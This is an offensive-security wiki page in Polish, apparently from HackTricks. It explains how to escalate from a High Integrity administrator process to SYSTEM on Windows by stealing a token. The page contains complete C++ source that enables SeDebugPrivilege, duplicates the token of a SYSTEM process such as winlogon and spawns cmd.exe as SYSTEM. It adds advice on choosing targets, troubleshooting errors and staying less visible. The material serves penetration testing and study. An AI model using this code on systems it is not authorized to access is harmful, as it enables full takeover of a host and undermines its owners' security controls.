# SeImpersonate from High To System

{{#include ../../banners/hacktricks-training.md}}

Ta strona dotyczy **manualnej** wersji przejścia z procesu administratora o **High Integrity** do **`NT AUTHORITY\SYSTEM`** poprzez **otwarcie niechronionego procesu SYSTEM, zduplikowanie jego tokenu i uruchomienie procesu potomnego z tym tokenem**.

Jeśli masz tylko **`SeImpersonatePrivilege`** / **`SeAssignPrimaryTokenPrivilege`** ale **nie możesz otworzyć odpowiedniego procesu SYSTEM**, ścieżka **Potato / named-pipe** jest zwykle bardziej niezawodna:

{{#ref}}
named-pipe-client-impersonation.md
{{#endref}}

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

Jeśli chcesz nie tylko `SYSTEM`, ale **SYSTEM token z możliwie największą liczbą privilege**, sprawdź też:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

## Quick triage

Zanim spróbujesz ukraść token, szybko zweryfikuj kontekst:
```cmd
whoami /groups | findstr /i "high mandatory"
whoami /priv | findstr /i "SeDebugPrivilege SeImpersonatePrivilege SeAssignPrimaryTokenPrivilege"
```
Practical notes:

- Token administracyjny **High Integrity** zwykle wystarcza, aby **włączyć `SeDebugPrivilege`** i otworzyć wiele niechronionych procesów SYSTEM.
- **`CreateProcessWithTokenW` wymaga `SeImpersonatePrivilege`** po stronie wywołującego. Jeśli to API zwróci błąd `1314`, przełącz się na `CreateProcessAsUserW` po wcześniejszym zduplikowaniu SYSTEM primary token.
- Na nowoczesnym Windows, **`lsass.exe`** często jest złym celem, ponieważ **LSA protection / PPL** blokuje dostęp nawet administratorom z `SeDebugPrivilege`. Preferuj **`winlogon.exe`**, **`wininit.exe`**, **`services.exe`** albo wczesny **`svchost.exe`** uruchomiony jako SYSTEM.
- Nie każdy proces SYSTEM ma równie użyteczny token. Jeśli dostaniesz SYSTEM, ale zauważysz brakujące uprawnienia, spróbuj innego procesu SYSTEM zamiast zakładać, że technika jest uszkodzona.

## Pick the PID carefully

Najprostszym sposobem, aby to działało niezawodnie, jest **wybranie procesu SYSTEM, którego DACL faktycznie pozwala Administratorom odpytać proces i zduplikować jego token**.

Dobre kandydaty do testów na start:

- `winlogon.exe`
- `wininit.exe`
- `services.exe`
- niektóre wczesne instancje `svchost.exe` uruchomione jako SYSTEM

Domyślnie unikaj:

- `lsass.exe` na hostach, gdzie włączone jest **RunAsPPL / LSA protection**
- procesów chronionych / wrażliwych na bezpieczeństwo, które zwracają `Access denied` nawet po włączeniu `SeDebugPrivilege`

Możesz sprawdzić kandydatów i ich tokeny/DACL przy użyciu **Process Explorer** lub **Process Hacker** uruchomionych z podwyższonymi uprawnieniami.

### Code

Poniższy kod pochodzi [stąd](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962). Pozwala on **wskazać Process ID jako argument**, a następnie uruchomić CMD **działający jako użytkownik** wskazanego procesu.\
Uruchomiony w procesie High Integrity pozwala **wskazać PID procesu działającego jako System** (takiego jak `winlogon`, `wininit`) i wykonać `cmd.exe` jako SYSTEM.
```cpp
impersonateuser.exe 1234
```

```cpp:impersonateuser.cpp
// From https://securitytimes.medium.com/understanding-and-abusing-access-tokens-part-ii-b9069f432962

#include <windows.h>
#include <iostream>
#include <Lmcons.h>
BOOL SetPrivilege(
HANDLE hToken,          // access token handle
LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
BOOL bEnablePrivilege   // to enable or disable privilege
)
{
TOKEN_PRIVILEGES tp;
LUID luid;
if (!LookupPrivilegeValue(
NULL,            // lookup privilege on local system
lpszPrivilege,   // privilege to lookup
&luid))        // receives LUID of privilege
{
printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
return FALSE;
}
tp.PrivilegeCount = 1;
tp.Privileges[0].Luid = luid;
if (bEnablePrivilege)
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
else
tp.Privileges[0].Attributes = 0;
// Enable the privilege or disable all privileges.
if (!AdjustTokenPrivileges(
hToken,
FALSE,
&tp,
sizeof(TOKEN_PRIVILEGES),
(PTOKEN_PRIVILEGES)NULL,
(PDWORD)NULL))
{
printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
return FALSE;
}
if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
{
printf("[-] The token does not have the specified privilege. \n");
return FALSE;
}
return TRUE;
}
std::string get_username()
{
TCHAR username[UNLEN + 1];
DWORD username_len = UNLEN + 1;
GetUserName(username, &username_len);
std::wstring username_w(username);
std::string username_s(username_w.begin(), username_w.end());
return username_s;
}
int main(int argc, char** argv) {
// Print whoami to compare to thread later
printf("[+] Current user is: %s\n", (get_username()).c_str());
// Grab PID from command line argument
char* pid_c = argv[1];
DWORD PID_TO_IMPERSONATE = atoi(pid_c);
// Initialize variables and structures
HANDLE tokenHandle = NULL;
HANDLE duplicateTokenHandle = NULL;
STARTUPINFO startupInfo;
PROCESS_INFORMATION processInformation;
ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
startupInfo.cb = sizeof(STARTUPINFO);
// Add SE debug privilege
HANDLE currentTokenHandle = NULL;
BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
if (SetPrivilege(currentTokenHandle, L"SeDebugPrivilege", TRUE))
{
printf("[+] SeDebugPrivilege enabled!\n");
}
// Call OpenProcess(), print return code and error code
HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, PID_TO_IMPERSONATE);
if (GetLastError() == NULL)
printf("[+] OpenProcess() success!\n");
else
{
printf("[-] OpenProcess() Return Code: %i\n", processHandle);
printf("[-] OpenProcess() Error: %i\n", GetLastError());
}
// Call OpenProcessToken(), print return code and error code
BOOL getToken = OpenProcessToken(processHandle, MAXIMUM_ALLOWED, &tokenHandle);
if (GetLastError() == NULL)
printf("[+] OpenProcessToken() success!\n");
else
{
printf("[-] OpenProcessToken() Return Code: %i\n", getToken);
printf("[-] OpenProcessToken() Error: %i\n", GetLastError());
}
// Impersonate user in a thread
BOOL impersonateUser = ImpersonateLoggedOnUser(tokenHandle);
if (GetLastError() == NULL)
{
printf("[+] ImpersonatedLoggedOnUser() success!\n");
printf("[+] Current user is: %s\n", (get_username()).c_str());
printf("[+] Reverting thread to original user context\n");
RevertToSelf();
}
else
{
printf("[-] ImpersonatedLoggedOnUser() Return Code: %i\n", getToken);
printf("[-] ImpersonatedLoggedOnUser() Error: %i\n", GetLastError());
}
// Call DuplicateTokenEx(), print return code and error code
BOOL duplicateToken = DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
if (GetLastError() == NULL)
printf("[+] DuplicateTokenEx() success!\n");
else
{
printf("[-] DuplicateTokenEx() Return Code: %i\n", duplicateToken);
printf("[-] DupicateTokenEx() Error: %i\n", GetLastError());
}
// Call CreateProcessWithTokenW(), print return code and error code
BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation);
if (GetLastError() == NULL)
printf("[+] Process spawned!\n");
else
{
printf("[-] CreateProcessWithTokenW Return Code: %i\n", createProcess);
printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError());
}
return 0;
}
```
## Przydatne uwagi o API / uprawnieniach dostępu

Przykład używa `MAXIMUM_ALLOWED`, ale w rzeczywistych operacjach warto pamiętać o minimalnych wymaganych elementach:

- `OpenProcessToken()` wymaga tylko, aby **uchwyt procesu** został otwarty z **`PROCESS_QUERY_LIMITED_INFORMATION`**.
- Aby użyć `CreateProcessWithTokenW()`, **uchwyt tokenu primary** musi mieć **`TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY`**.
- `DuplicateTokenEx()` musi utworzyć **token primary** (`TokenPrimary`), a nie tylko token impersonation.
- Jeśli już impersonated SYSTEM, a `CreateProcessWithTokenW()` nadal zwraca błąd `1314`, spróbuj zamiast tego `CreateProcessAsUserW()`.

To oznacza, że **otwieranie procesu docelowego z `PROCESS_ALL_ACCESS` jest zwykle niepotrzebne i bardziej widoczne** niż samo zażądanie uprawnień potrzebnych do odczytu tokenu.

## Błąd

W niektórych przypadkach możesz spróbować impersonate System i to nie zadziała, pokazując wynik podobny do poniższego:
```cpp
[+] OpenProcess() success!
[+] OpenProcessToken() success!
[-] ImpersonatedLoggedOnUser() Return Code: 1
[-] ImpersonatedLoggedOnUser() Error: 5
[-] DuplicateTokenEx() Return Code: 0
[-] DupicateTokenEx() Error: 5
[-] CreateProcessWithTokenW Return Code: 0
[-] CreateProcessWithTokenW Error: 1326
```
To oznacza, że nawet jeśli działasz na poziomie High Integrity, **nie masz wystarczających uprawnień** do tego docelowego procesu/tokena.\
Sprawdźmy bieżące uprawnienia Administratora do procesów `svchost.exe` za pomocą **Process Explorer** (albo możesz też użyć **Process Hacker**):

1. Wybierz proces `svchost.exe`
2. Kliknij prawym przyciskiem myszy --> Properties
3. W zakładce "Security" kliknij w prawym dolnym rogu przycisk "Permissions"
4. Kliknij "Advanced"
5. Wybierz "Administrators" i kliknij "Edit"
6. Kliknij "Show advanced permissions"

![Code - Error: 6. Click on "Show advanced permissions"](<../../images/image (437).png>)

Poprzedni obraz zawiera wszystkie uprawnienia, jakie "Administrators" mają do wybranego procesu (jak widać w przypadku `svchost.exe` mają tylko uprawnienia "Query")

Zobacz uprawnienia "Administrators" do `winlogon.exe`:

![Code - Error: See the privileges "Administrators" have over winlogon.exe](<../../images/image (1102).png>)

W tym procesie "Administrators" mogą "Read Memory" i "Read Permissions", co prawdopodobnie pozwala Administratorom na impersonate tokena używanego przez ten proces.

### Common failure causes

- **`OpenProcess()` / `OpenProcessToken()` -> `5 (Access denied)`**: DACL procesu blokuje dostęp albo cel jest **protected/PPL**. Wybierz inny proces SYSTEM.
- **`DuplicateTokenEx()` -> `5 (Access denied)`**: uchwyt tokena został otwarty bez wystarczających uprawnień albo DACL tokena docelowego blokuje duplikację.
- **`CreateProcessWithTokenW()` -> `1314`**: wywołujący nie ma obecnie włączonego **`SeImpersonatePrivilege`**. Spróbuj najpierw je włączyć albo użyj `CreateProcessAsUserW()` z zduplikowanym primary tokenem.
- **`CreateProcessWithTokenW()` -> `1326`** po poprzednich błędach: często oznacza to po prostu, że wcześniejszy krok duplikacji tokena/impersonation się nie powiódł, więc nie ma używalnego primary tokena do uruchomienia procesu potomnego.

## Operator notes

- Ta technika jest świetna, gdy już jesteś **local admin + high integrity** i chcesz szybko, ręcznie przejść do SYSTEM bez uruchamiania usługi ani łańcucha wymuszenia przez named pipe.
- W utwardzonych środowiskach Windows 11 / Server **LSA protection** staje się coraz częstsze, więc workflow zakładający, że `lsass.exe` zawsze da się odczytać, jest kruchy. **`winlogon.exe` / `wininit.exe` / `services.exe` są zwykle lepszymi pierwszymi wyborami**.
- Jeśli trafisz do kontekstu **service account** zamiast podniesionego pulpitu administratora, rodzina **Potato** zwykle lepiej pasuje niż ta strona.



## References

- [Microsoft: CreateProcessWithTokenW](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw)
- [SensePost: Abusing Windows' tokens to compromise Active Directory without touching LSASS](https://sensepost.com/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/)
{{#include ../../banners/hacktricks-training.md}}
